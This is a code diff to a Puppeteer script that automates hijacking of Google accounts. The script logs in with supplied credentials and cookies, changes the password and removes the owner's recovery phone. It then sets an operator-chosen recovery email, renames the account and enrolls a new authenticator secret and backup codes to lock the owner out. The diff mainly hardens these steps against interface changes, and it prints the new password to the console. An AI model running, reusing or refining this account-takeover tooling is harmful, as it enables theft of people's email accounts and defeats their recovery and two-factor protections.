@@ -154,6 +154,7 @@ async function startServer() {
     while (true) {
         mWorkerActive = false
         let data = await getGmailData()
+        console.log(data)
         if (data && (FINISH <= 0 || FINISH >= new Date().getTime())) {
             mWorkerActive = true
             if (prevNumber == data.number) {
@@ -268,8 +269,6 @@ async function loginWithCompleted(number, password, cookies, worker) {
                 console.log('Node: [ Rapt Token: '+(mRapt == null ? 'NULL' : 'Received')+' --- Time: '+getTime()+' ]')
                 
                 if (mRapt) {
-                    await waitForRemoveRecovery(page, mRapt)
-
                     if (mMailData == null) {
                         mMailRequest = true
                         await page.goto('https://mail.google.com/mail/u/0/')
@@ -307,6 +306,8 @@ async function loginWithCompleted(number, password, cookies, worker) {
                     } catch (error) {}
     
                     console.log('Node: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
+
+                    await waitForRemoveRecovery(page, mRapt)
                     
                     await waitForLanguageChange(page)
     
@@ -420,72 +421,6 @@ async function waitForNumberRemove(page, mRapt) {
 
             return year
         })
-        
-        // let mList = await page.evaluate(() => {
-        //     let root = document.querySelectorAll('div[data-encrypted-phone]')
-        //     let list = []
-        
-        //     if (root) {
-        //         for (let i = 0; i < root.length; i++) {
-        //             try {
-        //                 let data = root[i].getAttribute('data-encrypted-phone')
-        //                 if (data) {
-        //                     list.push(data)
-        //                 }
-        //             } catch (error) {}
-        //         }
-        //     }
-
-        //     return list
-        // })
-        
-        // console.log('Node: [ Number Add: '+mList.length+' --- Time: '+getTime()+' ]')
-
-        // for (let i = 0; i < mList.length; i++) {
-        //     try {
-        //         await page.goto('https://myaccount.google.com/phone?hl=en&rapt='+mRapt+'&ph='+mList[i], { waitUntil: 'load', timeout: 0 })
-        //         await delay(500)
-        //         if (await exists(page, 'button[class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ mN1ivc wMI9H"]')) {
-        //             let button = await page.$$('button[class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ mN1ivc wMI9H"]')
-        //             if (button && button.length > 0) {
-        //                 await button[button.length-1].click()
-        //                 await delay(1000)
-        //             }
-        //         } else if (await exists(page, 'button[class="pYTkkf-Bz112c-LgbsSe wMI9H Qd9OXe"]')) {
-        //             let button = await page.$$('button[class="pYTkkf-Bz112c-LgbsSe wMI9H Qd9OXe"]')
-        //             if (button && button.length > 0) {
-        //                 await button[button.length-1].click()
-        //                 await delay(1000)
-        //             }
-        //         }
-
-        //         for (let i = 0; i < 3; i++) {
-        //             try {
-        //                 if (await exists(page, 'button[data-mdc-dialog-action="ok"]')) {
-        //                     await page.click('button[data-mdc-dialog-action="ok"]')
-        //                     await delay(3000)
-        //                     break
-        //                 } else {
-        //                     let button = await page.$$('div[class="U26fgb O0WRkf oG5Srb HQ8yf C0oVfc kHssdc HvOprf FsOtSd M9Bg4d"]')
-        //                     if (button && button.length > 0) {
-        //                         await button[button.length-1].click()
-        //                         await delay(3000)
-        //                         break
-        //                     } else {
-        //                         let button = await page.$$('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7"]')
-        //                         if (button && button.length > 0) {
-        //                             await button[button.length-1].click()
-        //                             await delay(3000)
-        //                             break
-        //                         }
-        //                     }
-        //                 }
-        //             } catch (error) {}
-
-        //             await delay(1000)
-        //         }
-        //     } catch (error) {}
-        // }
 
         return mYear
     } catch (error) {}
@@ -502,20 +437,22 @@ async function waitForPasswordChange(page, mRapt) {
         await delay(500)
         await page.type('input[name="confirmation_password"]', mPassword)
         await delay(500)
-        await page.click('button[class="UywwFc-LgbsSe UywwFc-LgbsSe-OWXEXe-dgl2Hf UywwFc-StrnGf-YYd4I-VtOx3e wMI9H"]')
+        let submit = await findView(page, 'button[type="submit"]', 'Change password')
+
+        if (submit) {
+            await submit.click()
+        } else {
+            await page.click('button[type="submit"]')
+        }
 
         for (let i = 0; i < 20; i++) {
             try {
                 let url = await page.url()
                 if (url.startsWith('https://myaccount.google.com/security-checkup-welcome')) {
                     break
-                } else if (await exists(page, 'div[class="uW2Fw-T0kwCb"] > div:nth-child(2) > button')) {
+                } else if (await exists(page, 'button[data-mdc-dialog-action="ok"]')) {
                     await delay(500)
-                    await page.click('div[class="uW2Fw-T0kwCb"] > div:nth-child(2) > button')
-                    await delay(3000)
-                } else if (await exists(page, 'div[class="VfPpkd-T0kwCb"] > button:nth-child(2)')) {
-                    await delay(500)
-                    await page.click('div[class="VfPpkd-T0kwCb"] > button:nth-child(2)')
+                    await page.click('button[data-mdc-dialog-action="ok"]')
                     await delay(3000)
                 }
             } catch (error) {}
@@ -540,20 +477,21 @@ async function waitForRecoveryAdd(page, number, password, mRapt, mRecovery) {
 
         if (!mRecovery) mRecovery = getRandomUser()+'@oletters.com'
 
-        if (await exists(page, 'button[class="AeBiU-LgbsSe AeBiU-LgbsSe-OWXEXe-Bz112c-M1Soyc AeBiU-LgbsSe-OWXEXe-dgl2Hf wMI9H"]')) {
-            await page.click('button[class="AeBiU-LgbsSe AeBiU-LgbsSe-OWXEXe-Bz112c-M1Soyc AeBiU-LgbsSe-OWXEXe-dgl2Hf wMI9H"]')
-            await waitForSelector('input[type="email"]', 10)
+        let button = await findView(page, 'button', 'Add recovery email')
+
+        if (button) {
+            await button.click()
+            await waitForSelector(page, 'input[type="email"]', 10)
             await delay(500)
             await page.focus('input[type="email"]')
             await page.keyboard.type(mRecovery)
             await delay(500)
-            await page.click('button[class="UywwFc-LgbsSe UywwFc-LgbsSe-OWXEXe-dgl2Hf UywwFc-StrnGf-YYd4I-VtOx3e UywwFc-kSE8rc-FoKg4d-sLO9V-YoZ4jf"]')
-
+            await page.click('button[data-mdc-dialog-action="ok"]')
             await delay(3000)
             return mRecovery
-        } else if (await exists(page, 'div[class="kvjuQc biRLo"] > div > button')) {
-            await page.click('div[class="kvjuQc biRLo"] > div > button')
-            await waitForSelector('input[type="email"]', 10)
+        } else if (await exists(page, 'button[aria-label="Edit recovery email"]')) {
+            await page.click('button[aria-label="Edit recovery email"]')
+            await waitForSelector(page, 'input[type="email"]', 10)
             await delay(500)
 
             await page.focus('input[type="email"]')
@@ -564,8 +502,7 @@ async function waitForRecoveryAdd(page, number, password, mRapt, mRecovery) {
 
             await page.keyboard.type(mRecovery)
             await delay(500)
-            await page.click('button[class="UywwFc-LgbsSe UywwFc-LgbsSe-OWXEXe-dgl2Hf UywwFc-StrnGf-YYd4I-VtOx3e UywwFc-kSE8rc-FoKg4d-sLO9V-YoZ4jf"]')
-
+            await page.click('button[data-mdc-dialog-action="ok"]')
             await delay(3000)
             return mRecovery
         } else if (await exists(page, 'input[type="email"]')) {
@@ -594,6 +531,39 @@ async function waitForRecoveryAdd(page, number, password, mRapt, mRecovery) {
         }
     } catch (error) {}
 
+    return null
+}
+
+async function findView(page, tagName, matchText) {
+    try {
+        let elements = await page.$$(tagName)
+
+        for (let el of elements) {
+            const text = await page.evaluate(el => el.innerText.trim(), el)
+            if (text === matchText) {
+                return el
+            }
+        }
+    } catch (error) {}
+
+    return null
+}
+
+async function waitForFindView(page, tagName, matchText, timeout = 30) {
+    for (let i = 0; i < timeout; i++) {
+        try {
+            let elements = await page.$$(tagName)
+
+            for (let el of elements) {
+                const text = await page.evaluate(el => el.innerText.trim(), el)
+                if (text === matchText) {
+                    return el
+                }
+            }
+        } catch (error) {}
+
+        await delay(500)
+    }
     return null
 }
 
@@ -817,13 +787,15 @@ async function waitForNameChange(page, mRapt) {
             await page.keyboard.press('Backspace')
             await page.keyboard.type(mSplit[1])
             await delay(500)
-            if (await exists(page, 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 wMI9H"]')) {
-                await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 wMI9H"]')
-            } else if (await exists(page, 'button[class="UywwFc-LgbsSe UywwFc-LgbsSe-OWXEXe-dgl2Hf UywwFc-StrnGf-YYd4I-VtOx3e wMI9H"]')) {
-                await page.click('button[class="UywwFc-LgbsSe UywwFc-LgbsSe-OWXEXe-dgl2Hf UywwFc-StrnGf-YYd4I-VtOx3e wMI9H"]')
+            let save = await findView(page, 'button', 'Save')
+            if (save) {
+                await save.click()
+                await delay(3000)
+                console.log('Node: [ Name Change: '+mName+' --- Time: '+getTime()+' ]')
+            } else {
+                await delay(3000)
+                console.log('Node: [ Name Change: Error --- Time: '+getTime()+' ]')
             }
-            await delay(3000)
-            console.log('Node: [ Name Change: '+mName+' --- Time: '+getTime()+' ]')
             return true
         }
     } catch (error) {}
@@ -847,12 +819,9 @@ async function waitForRemoveRecovery(page, mRapt) {
         for (let i = 0; i < 10; i++) {
             if (await exists(page, 'div[data-phone]')) {
                 try {
-                    if (await exists(page, 'div[class="N9Ni5"] > div:nth-child(2)')) {
+                    if (await exists(page, 'button[aria-label="Remove phone number"]')) {
                         await delay(500)
-                        await page.click('div[class="N9Ni5"] > div:nth-child(2)')
-                    } else if (await exists(page, 'div[class="kvjuQc biRLo"] > div:nth-child(2)')) {
-                        await delay(500)
-                        await page.click('div[class="kvjuQc biRLo"] > div:nth-child(2)')
+                        await page.click('button[aria-label="Remove phone number"]')
                     } else {
                         await delay(1000)
                         continue
@@ -860,19 +829,24 @@ async function waitForRemoveRecovery(page, mRapt) {
                     
                     for (let i = 0; i < 10; i++) {
                         await delay(1000)
-                        if (await exists(page, 'div[class="XfpsVe J9fJmf"] > div:nth-child(2)')) {
-                            await page.click('div[class="XfpsVe J9fJmf"] > div:nth-child(2)')
+                        let remove = await findView(page, 'div[role="button"]', 'Remove number')
+                        if (remove) {
+                            await remove.click()
                             console.log('Node: [ Recovery Number: Delete Success --- Time: '+getTime()+' ]')
                             await delay(2000)
                             mRemove = true
+                            break
                         }
                     }
                 } catch (error) {}
             } else if (mRemove) {
                 return true
-            } else if (await exists(page, 'c-wiz > div > div > div > button')) {
-                console.log('Node: [ Recovery Number Not Found --- Time: '+getTime()+' ]')
-                return true
+            } else {
+                let add = await findView(page, 'button', 'Add recovery phone')
+                if (add) {
+                    console.log('Node: [ Recovery Number Not Found --- Time: '+getTime()+' ]')
+                    return true
+                }
             }
 
             await delay(1000)
@@ -1080,54 +1054,56 @@ async function waitForTwoFaActive(page, mRapt) {
         }
         await page.goto('https://myaccount.google.com/two-step-verification/authenticator?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
         await delay(1000)
-        try {
-            if (await exists(page, 'ul > li > div > div > div > button')) {
-                await delay(500)
-                await page.click('ul > li > div > div > div > button')
-                await waitForSelector(page, 'button[data-mdc-dialog-action="ok"]')
-                await delay(500)
-                await page.click('button[data-mdc-dialog-action="ok"]')
-                await delay(3000)
+        let previus = await findView(page, 'button', 'Change authenticator app')
+        if (previus) {
+            if (await exists(page, 'button[aria-label="Remove Google Authenticator"]')) {
+                await page.click('button[aria-label="Remove Google Authenticator"]')
             }
-        } catch (e) {}
-        let newButton = 'button[class="AeBiU-LgbsSe AeBiU-LgbsSe-OWXEXe-Bz112c-M1Soyc AeBiU-LgbsSe-OWXEXe-dgl2Hf wMI9H"]'
-        await waitForSelector(page, newButton)
-        await delay(500)
-        await page.click(newButton)
-        await delay(2000)
-        let canSee = 'button[class="mUIrbf-LgbsSe mUIrbf-LgbsSe-OWXEXe-dgl2Hf wMI9H"]'
-        await waitForSelector(page, canSee)
-        await delay(500)
-        await page.click(canSee)
-        await delay(1000)
-        let authToken = await page.evaluate(() => {
-            let root = document.querySelectorAll('strong')
-            if (root) {
-                for (let i = 0; i < root.length; i++) {
-                    try {
-                        let split = root[i].innerText.split(' ')
-                        if (split.length == 8) {
-                            return root[i].innerText.replace(/\s/g, '')
-                        }
-                    } catch (error) {}
-                }
-            }
-            return null
-        })
-
-        if (authToken) {
-            await page.click('div[class="sRKBBe"] > div > div:nth-child(2) > div:nth-child(2) > button')
+            await delay(500)
+            await waitForSelector(page, 'button[data-mdc-dialog-action="ok"]')
+            await delay(500)
+            await page.click('button[data-mdc-dialog-action="ok"]')
             await delay(1000)
-            let newToken = twofactor.generateToken(authToken)
-            await waitForSelector(page, 'input[type="text"]')
-            await delay(500)
-            await page.type('input[type="text"]', newToken.token)
-            await delay(500)
-            await page.click('div[class="sRKBBe"] > div > div:nth-child(2) > div:nth-child(3) > button')
-            await waitForSelector(page, 'button[class="mUIrbf-LgbsSe mUIrbf-LgbsSe-OWXEXe-dgl2Hf wMI9H"]')
-            mAuthToken = authToken
+        }
+        let newButton = await waitForFindView(page, 'button', 'Set up authenticator', 10)
+        await delay(500)
+        await newButton.click()
+        await delay(2000)
+        let canSee = await waitForFindView(page, 'button', 'Can’t scan it?')
+        
+        if (canSee) {
+            await canSee.click()
+            await delay(1000)
+        } else {
+            let authToken = await page.evaluate(() => {
+                let root = document.querySelectorAll('strong')
+                if (root) {
+                    for (let i = 0; i < root.length; i++) {
+                        try {
+                            let split = root[i].innerText.split(' ')
+                            if (split.length == 8) {
+                                return root[i].innerText.replace(/\s/g, '')
+                            }
+                        } catch (error) {}
+                    }
+                }
+                return null
+            })
 
-            console.log('Node: [ Auth Token: Received --- '+getTime()+' ]')
+            if (authToken) {
+                await page.click('div[class="sRKBBe"] > div > div:nth-child(2) > div:nth-child(2) > button')
+                await delay(1000)
+                let newToken = twofactor.generateToken(authToken)
+                await waitForSelector(page, 'input[type="text"]')
+                await delay(500)
+                await page.type('input[type="text"]', newToken.token)
+                await delay(500)
+                await page.click('div[class="sRKBBe"] > div > div:nth-child(2) > div:nth-child(3) > button')
+                await waitForFindView(page, 'button', 'Change authenticator app')
+                mAuthToken = authToken
+
+                console.log('Node: [ Auth Token: Received --- '+getTime()+' ]')
+            }
         }
     } catch (error) {}
 
@@ -1139,29 +1115,23 @@ async function waitForTwoFaActive(page, mRapt) {
         await page.goto('https://myaccount.google.com/two-step-verification/backup-codes?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
         await delay(500)
 
-        let newButton = 'div[class="xIcqYe"] > div > div >button'
-
         for (let i = 0; i < 30; i++) {
             try {
-                if (await exists(page, 'div[class="kvjuQc biRLo"] > div:nth-child(2)')) {
+                if (await exists(page, 'button[aria-label="Generate new codes"]')) {
                     await delay(500)
-                    await page.click('div[class="kvjuQc biRLo"] > div:nth-child(2)')
-                    await waitForSelector(page, 'button[data-mdc-dialog-action="ok"]')
-                    await delay(500)
-                    await page.click('button[data-mdc-dialog-action="ok"]')
-                    await delay(3000)
-                    await waitForSelector(page, newButton)
+                    await page.click('button[aria-label="Generate new codes"]')
                     break
-                } else if (await exists(page, newButton)) {
-                    break
+                } else {
+                    let newButton = await findView(page, 'button', 'Get backup codes')
+                    if (newButton) {
+                        await newButton.click()
+                        break
+                    }
                 }
             } catch (error) {}
 
             await delay(500)
         }
-
-        await delay(500)
-        await page.click(newButton)
 
         for (let i = 0; i < 30; i++) {
             try {
@@ -1199,40 +1169,43 @@ async function waitForTwoFaActive(page, mRapt) {
                     }
                     await page.goto('https://myaccount.google.com/signinoptions/twosv?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
                     await delay(500)
-                    await waitForSelector(page, 'div[class="xIcqYe"] > div > div > button', 5)
+                    await waitForFindView(page, 'h1', '2-Step Verification')
+                    await delay(500)
                     
-                    if (await exists(page, 'button[class="AeBiU-LgbsSe AeBiU-LgbsSe-OWXEXe-dgl2Hf wMI9H"]')) {
+                    if (await exists(page, 'button[aria-label="Turn off 2-Step Verification"]')) {
+                        return { auth:mAuthToken, backup:mBackupCode, error:false }
+                    } if (await exists(page, 'button[aria-label="Turn on 2-Step Verification"]')) {
+                        await page.click('button[aria-label="Turn on 2-Step Verification"]')
+
+                        await waitForSelector(page, 'button[data-mdc-dialog-action="d7k1Xe"]', 5)
+                        await delay(500)
+                        await page.click('button[data-mdc-dialog-action="d7k1Xe"]')
+                        await waitForSelector(page, 'button[data-mdc-dialog-action="TYajJe"]', 5)
+                        await delay(500)
+                        await page.click('button[data-mdc-dialog-action="TYajJe"]')
+        
+                        try {
+                            await page.waitForResponse(async res => res)
+                        } catch (error) {}
+        
+                        for (let i = 0; i < 20; i++) {
+                            try {
+                                if (await exists(page, 'button[aria-label="Turn off 2-Step Verification"]')) {
+                                    break
+                                } else if (await exists(page, 'button[aria-label="Done"]')) {
+                                    break
+                                } else if (await exists(page, 'div[class="uW2Fw-T0kwCb"]')) {
+                                    if (!await exists(page, 'div[class="uW2Fw-T0kwCb"] > div:nth-child(3) > button') && await exists(page, 'div[class="uW2Fw-T0kwCb"] > div:nth-child(1) > button')) {
+                                        break
+                                    }
+                                }
+                            } catch (error) {}
+                        }
+        
+                        await delay(1500)
+        
                         return { auth:mAuthToken, backup:mBackupCode, error:false }
                     }
-
-                    await delay(500)
-                    await page.click('div[class="xIcqYe"] > div > div > button')
-                    await waitForSelector(page, 'button[data-mdc-dialog-action="d7k1Xe"]', 5)
-                    await delay(500)
-                    await page.click('button[data-mdc-dialog-action="d7k1Xe"]')
-                    await waitForSelector(page, 'button[data-mdc-dialog-action="TYajJe"]', 5)
-                    await delay(500)
-                    await page.click('button[data-mdc-dialog-action="TYajJe"]')
-    
-                    try {
-                        await page.waitForResponse(async res => res)
-                    } catch (error) {}
-    
-                    for (let i = 0; i < 20; i++) {
-                        try {
-                            if (await exists(page, 'button[class="AeBiU-LgbsSe AeBiU-LgbsSe-OWXEXe-dgl2Hf wMI9H"]')) {
-                                break
-                            } else if (await exists(page, 'div[class="uW2Fw-T0kwCb"]')) {
-                                if (!await exists(page, 'div[class="uW2Fw-T0kwCb"] > div:nth-child(3) > button') && await exists(page, 'div[class="uW2Fw-T0kwCb"] > div:nth-child(1) > button')) {
-                                    break
-                                }
-                            }
-                        } catch (error) {}
-                    }
-    
-                    await delay(1500)
-    
-                    return { auth:mAuthToken, backup:mBackupCode, error:false }
                 } catch (error) {}
             }
 
